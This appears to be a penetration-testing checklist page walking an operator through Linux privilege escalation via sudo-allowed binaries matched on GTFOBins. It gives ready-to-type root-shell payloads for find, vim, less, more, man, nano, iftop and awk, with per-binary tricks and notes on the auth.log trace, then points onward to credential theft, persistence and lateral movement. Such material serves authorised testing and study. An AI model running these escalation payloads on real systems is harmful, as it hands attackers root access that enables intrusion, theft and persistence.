
⚠️ **Hard preconditions — verified in Step 1.**

- **Current user has sudo entitlement to at least one binary** for which a GTFOBins entry exists with a Shell function AND the Shell function has a populated Sudo tab.
- **Authentication available.** Either NOPASSWD on the chosen binary, or the current user's password (foothold creds usually suffice).
- **Non-destructive.** No filesystem modification; root shell spawned in-process. IOCs: `auth.log` entry for the `sudo` invocation.

No external lookup needed beyond GTFOBins for the specific payload — preconditions checked in Step 1 below.

---

## Step 1 — Preflight: enumerate sudo entitlements and find GTFOBins match

### List ALL sudo-allowed commands:

`sudo -l`

If prompted for password, enter the current user's password if known. NOPASSWD entries surface without a password.

Output reading:

- `(root) NOPASSWD: /file/path/<binary>` → note the binary.
- `(root) /file/path/<binary>` (no NOPASSWD) → note the binary; password required at execution.
- `User <user> is not allowed to run sudo on <host>.` → walkthrough doesn't apply.
- `env_keep+=LD_PRELOAD` or `env_keep+=LD_LIBRARY_PATH` lines alongside any NOPASSWD entry → [[Sudo Environment Variables]] is a parallel route worth considering.
- `sudo: a password is required` (no further output) or "you must have a tty" → see [[Reverse Shell Stabilization]] for TTY upgrade.

### Cross-reference each binary on GTFOBins:

For each binary noted above, open `gtfobins.org/gtfobins/<binary>/`. The badges at the top of the page list the available functions (Shell, File Write, File Read, Inherit, etc.).

- **Shell** badge present AND clicking it leads to a 'Shell' section with a populated **Sudo** tab → exploitable. Note the binary + payload.
- **Shell** badge present (bordered with a dotted line) AND clicking it leads to a 'Inherit' section → **Sudo** tab populated (possibly across multiple sub-entries) → exploitable. Note 'Operates via inheritance'. 
- **Shell** badge absent → skip this binary for this walkthrough (binary doesn't spawn shells via sudo; may still be exploitable via File Write / File Read routes — coverage deferred). Note the functions it does have (e.g. `File Read`, `File Write`) for if/when those routes are built.
- URL 404s (binary not on GTFOBins) → skip this binary.

If at least one binary qualifies, proceed to Step 2. Otherwise walkthrough doesn't apply.

---

## Step 2 — Execute the GTFOBins payload

GTFOBins Sudo-tab payloads need translation, not direct copy-paste. Rules:

1. **Prefix line 1 with `sudo`.** GTFOBins assumes `sudo` is implicit on the Sudo tab. Operator types `sudo <line-1>` at the shell prompt.
2. **Subsequent lines are typed inside the launched program**, not at the shell.
3. **Shell-escape characters** (`!`, `:!`, `:shell`) invoke the program's built-in escape feature. Two behaviours:
   - **Direct**: shell appears immediately (e.g. find, awk).
   - **Prompted**: program displays a command prompt; type `/bin/sh` and Enter (e.g. iftop, less, more, man).

**Translation examples** (GTFOBins payload → operator actions):

- `find` (single-line payload): `sudo find . -exec /bin/sh \; -quit` → root shell appears.
- `iftop` (two-line payload `iftop` / `!/bin/sh`): `sudo iftop` → inside iftop press `!` (shift + 1) → at iftop's prompt type `/bin/sh` → Enter.
- `vim` (single-word payload `vim`): `sudo vim` → in vim type `:!/bin/sh` → Enter.
- `less` (two-line payload with file): `sudo less /etc/hostname` → press `!` → at less's prompt type `/bin/sh` → Enter.

**Gotchas:**

⚠️ **See per-binary gotchas below, for executable specifics**

- **Required argument**: less and man need a file/topic; less takes any readable file (`/etc/hostname` is universal), man takes any topic (`man man` works). For `more`, see per-binary gotcha — file size matters.
- **Placeholders**: payloads showing `<file>` or similar — replace with a concrete value before pasting.

---

## Step 3 — Verify elevation

`id`

- Output shows `uid=0(...)` → root authority achieved. Proceed to Decision.
- Output shows non-root UID → payload didn't escalate. Re-check that the GTFOBins payload was typed verbatim and the sudo invocation was correct.

---

## Per-binary gotchas

### nano

GTFOBins payload: 

`sudo nano`
`^R^X` 
`reset; sh 1>&0 2>&0`

Resulting shell appears garbled. **Before** doing anything else type `reset` and hit enter -> shell becomes usable. (**If a more cooperative sudo-allowed binary qualifies, prefer it**).

### man

Two routes, both on GTFOBins:

**Primary — Inherit via less:** 

`sudo man man` → 
type `!` (shift 1) → 
at prompt type `/bin/sh` → Enter.

**Fallback — HTML browser hijack:** 

`sudo man '-H/bin/sh #' man` (Requires functional `groff -Thtml` rendering toolchain. Fails with `man: command exited with status 3: ... | groff -mandoc -Thtml` on systems without grohtml or its dependencies.)

### awk

GTFOBins's awk page is an alias redirect: "This is an alias of `mawk`." All payloads on the page show `mawk` as the command name. 

**Use the binary name from `sudo -l`, not the payload's literal name.** For example, If `sudo -l` shows `/file/path/awk` then use `awk` not `mawk`: 

`sudo awk 'BEGIN {system("/bin/sh")}'` 

Sudoers matches the invoked binary path; `sudo mawk` is rejected with "user X is not allowed to execute" despite mawk and awk being functionally identical on Debian-derived systems.
### more

⚠️ **File argument must exceed terminal height**, or more dumps content and exits without entering interactive mode (no opportunity to press `!`).

GTFOBins payload: 

`sudo more <file>` → 
press `!` (shift 1) → 
at more's prompt type `/bin/sh` → Enter.

Reliable long-file choices:
- `/etc/services` — typically 10000+ lines on most Linux systems
- `/etc/profile` — usually 30+ lines on Debian/Ubuntu
- `/var/log/auth.log` — long on any host with sudo activity (root-readable)

Short files (`/etc/hostname`, `/etc/hosts` on small networks) won't trigger pager mode.

## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction (additional users' hashes, SSH keys, app secrets) → [[Linux Credential Extraction Checksheet]]
- Persistence (SSH key, cron, systemd) → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]

